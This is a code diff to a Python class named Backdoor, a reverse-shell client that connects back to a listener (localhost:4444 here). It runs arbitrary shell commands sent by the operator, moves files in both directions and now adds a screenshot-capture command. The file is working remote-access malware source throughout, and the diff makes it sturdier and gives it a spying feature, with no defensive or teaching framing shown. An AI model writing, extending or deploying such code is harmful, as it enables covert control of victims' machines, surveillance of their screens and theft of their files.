@@ -1,7 +1,9 @@
 import socket, json
 import subprocess
 import os
+# os.system("pip3 install pyautogui")
 import base64
+import pyautogui
 
 
 class Backdoor:
@@ -40,7 +42,7 @@ class Backdoor:
         content = base64.b64decode(content)
         with open(path, "wb") as file:
             file.write(content)
-            self.reliable_send("[+] Upload succsessful")
+            return "[+] Upload succsessful"
 
     def read_file(self, path):
         file = open(path, "rb").read()
@@ -50,23 +52,29 @@ class Backdoor:
     def run(self):
         while True:
             command = str(self.reliable_recive())
-            if command.split()[0] == "exit":
-                self.connection.close()
-                exit()
-            elif command.split()[0] == "cd" and len(command) >= 2:
-                command_result = self.change_working_directory_to(command.split()[1])
-            elif command.split()[0] == "download":
-                command_result = self.read_file(command.split()[1])
-            elif command.split()[0] == "upload":
-                file = ""
-                list_for_file = command.split()
-                for t in range (2, len(list_for_file) - 1):
-                    file += list_for_file[t]
-                command_result = self.write_file(command.split()[1], file)
-            else:
-                command_result = self.execute_system_command(command)                          
-            
-            self.reliable_send(command_result)
+            try:
+                if command.split()[0] == "exit":
+                    self.connection.close()
+                    exit()
+                elif command.split()[0] == "cd" and len(command) >= 2:
+                    command_result = self.change_working_directory_to(command.split()[1])
+                elif command.split()[0] == "download":
+                    command_result = self.read_file(command.split()[1])
+                elif command.split()[0] == "upload":
+                    file_name = command.split()[1]
+                    file_content = command.replace(f"upload {file_name} ", "")
+                    command_result = self.write_file(file_name, file_content)
+                elif command.split()[0] == "screenshot":
+                    screenshot = pyautogui.screenshot()
+                    screenshot.save("screen.png")
+                    command_result = self.read_file("screen.png")
+                    os.system("rm screen.png")
+                    # "[+] Done! You get see it as screen.png"
+                else:
+                    command_result = self.execute_system_command(command)                                      
+                self.reliable_send(command_result)
+            except:
+                self.reliable_send("[-] Something was wrong!")
 
 
 my_backdoor = Backdoor("localhost", 4444)
